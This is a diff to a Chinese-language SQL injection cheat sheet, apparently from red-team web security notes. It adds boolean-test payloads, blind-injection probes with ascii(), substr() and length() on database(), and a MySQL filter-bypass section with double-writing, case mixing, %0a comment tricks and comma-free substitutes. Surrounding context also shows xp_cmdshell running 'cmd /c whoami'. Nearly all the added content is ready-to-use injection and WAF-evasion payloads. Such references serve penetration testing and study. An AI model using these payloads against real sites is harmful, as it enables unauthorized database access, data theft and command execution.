@@ -38,6 +38,10 @@
     * [MSSQL](#mssql)
     * [Oracle](#oracle)
 
+* [绕过技巧](#绕过技巧)
+    * [MYSQL](#mysql)
+    * [sqlserver](#sqlserver)
+
 ---
 
 **教程**
@@ -175,10 +179,12 @@
 > 注：True 或 False 语句应通过 HTTP 状态码或 HTML 内容返回不同的响应。如果这些响应与查询的 True/False 性质一致，则表示存在注入。
 
 - 逻辑测试
-    - 1.php?id=1 or 1=1 -- true
-    - 1.php?id=1' or 1=1 -- true
-    - 1.php?id=1" or 1=1 -- true
-    - 1.php?id=1 and 1=2 -- false
+    - 1.php?id=1 or 1=1     -- true
+    - 1.php?id=1' or 1=1    -- true
+    - 1.php?id=1" or 1=1    -- true
+    - 1.php?id=1 and 1=2    -- false
+    - 1.php?id=1-false
+    - 1.php?id=1-true
 - 算术
     - 1.php?id=1/1 -- true
     - 1.php?id=1/0 -- false
@@ -309,10 +315,19 @@ substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0x
 
 **ascii()**
 ```sql
+-- 库名长度判断
+ascii(substr(database(),1,1))>1
+
 -- 爆库名
 ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+    -- substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值
 
 ascii(substr((select database()),1,1))=98
+```
+
+**length()**
+```sql
+-- 库名长度判断
+length(database())>1
 ```
 
 **mid()**
@@ -663,16 +678,83 @@ exec master..xp_cmdshell 'cmd /c whoami'
 
 ## 绕过技巧
 
-
 ### MYSQL
 
-**关键词被替换**
+**常见的绕过技巧**
 
-双写或者大小写绕过
-```
+```bash
+# 双写
 seselectlect
+
+# 大小写
 SElect
+
+# 负数
+?id=1 ANd -1=-1
+
+# +号连接绕过
+?id=1+and+1=1
+?id=1+union+select+1+2
+
+# 无闭合
+?id=1 --+/*%0aand 1=1 --+*/
+
+# 有闭合
+?id=1 --+/*%0a'and 1=1 --+ --+*/
+?id=1 --+/*%0aand 1=1 --+*/
+?id=1 --+/*%0a'and 1=1 --+ --+*
 ```
+
+**过滤函数**
+- 替换
+    ```sql
+    and length(database())=7
+    HAVING length(database())=7
+    ```
+
+- 字符串截取函数
+    ```sql
+    Mid(version(),1,1)
+    Substr(version(),1,1)
+    Substring(version(),1,1)
+    Lpad(version(),1,1)
+    Rpad(version(),1,1)
+    Left(version(),1)
+    reverse(right(reverse(version()),1)
+    ```
+
+- 字符串连接函数
+    ```sql
+    concat(version(),'|',user());
+    concat_ws('|',1,2,3)
+    ```
+
+- 字符转换/编码
+    ```
+    Char(49)
+    Hex(‘a’)
+    Unhex(61)
+    Ascii(1)
+    ```
+
+**过滤了逗号**
+- limit 处的逗号
+
+    ```
+    limit 1 offset 0
+    ```
+
+- 字符串截取处的逗号
+
+    ```
+    mid(version() from 1 for 1)
+    ```
+
+- union 处的逗号
+
+    通过 join 拼接.
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/33.jpg)
 
 **参数和 union 之间的位置**
 - `\Nunion` 的形式
@@ -792,51 +874,6 @@ SElect
 - 括号
 
     ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/32.jpg)
-
-**过滤函数**
-- 字符串截取函数
-    ```sql
-    Mid(version(),1,1)
-    Substr(version(),1,1)
-    Substring(version(),1,1)
-    Lpad(version(),1,1)
-    Rpad(version(),1,1)
-    Left(version(),1)
-    reverse(right(reverse(version()),1)
-    ```
-
-- 字符串连接函数
-    ```sql
-    concat(version(),'|',user());
-    concat_ws('|',1,2,3)
-    ```
-
-- 字符转换
-    ```
-    Char(49)
-    Hex(‘a’)
-    Unhex(61)
-    Ascii(1)
-    ```
-
-**过滤了逗号**
-- limit 处的逗号
-
-    ```
-    limit 1 offset 0
-    ```
-
-- 字符串截取处的逗号
-
-    ```
-    mid(version() from 1 for 1)
-    ```
-
-- union 处的逗号
-
-    通过 join 拼接.
-
-    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/33.jpg)
 
 ---
 
